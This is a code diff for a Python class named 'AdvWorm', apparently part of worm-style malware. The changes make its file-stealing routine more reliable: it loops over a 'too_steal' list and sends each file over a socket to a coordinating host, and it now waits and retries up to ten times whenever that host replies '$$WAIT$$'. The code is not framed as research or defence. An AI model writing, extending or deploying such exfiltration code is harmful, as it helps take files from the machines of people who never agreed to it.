@@ -27,6 +27,7 @@ class AdvWorm(BasicWorm):
         super().__init__()
         self.name = "Advanced Worm"
         self._wait4coor = 4
+        self._pauseSend = 2
     
     def getPwd(self) -> str:
         return str(os.getcwd())
@@ -64,9 +65,11 @@ class AdvWorm(BasicWorm):
         
 
 
-    def sendFile(self, name: str, target: str = None, dir_index: str = None) -> None:
+    def sendFile(self, name: str, target: str = None, dir_index: str = None) -> bool:
         if not target:
             target = os.path.join(self.getPwd(), name)
+        else:
+            target = os.path.join(target, name)
         flen = self.fileTracking(target)
         if not flen:
             return None
@@ -81,6 +84,8 @@ class AdvWorm(BasicWorm):
         except socket.timeout:
             return None
         resp = resp.split(" ")
+        if resp[0] == "$$WAIT$$":
+            return "wait"
         if len(resp) < 2:
             return None
         port, xtra = self.makeXtraSock(resp[1])
@@ -109,7 +114,15 @@ class AdvWorm(BasicWorm):
         self.sendMsg(msg)
         sleep(0.5)
         for ts in too_steal:
-            self.sendFile(ts[0], ts[1], dirIndex)
+            count = 0
+            while count < 10:
+                sending = self.sendFile(ts[0], ts[1], dirIndex)
+                if sending == "wait":
+                    count += 1
+                    sleep(self._pauseSend)
+                    continue
+                else:
+                    break
     
     def splitCMD(self, cmd: str) -> list:
         cmd = cmd.split("$$")
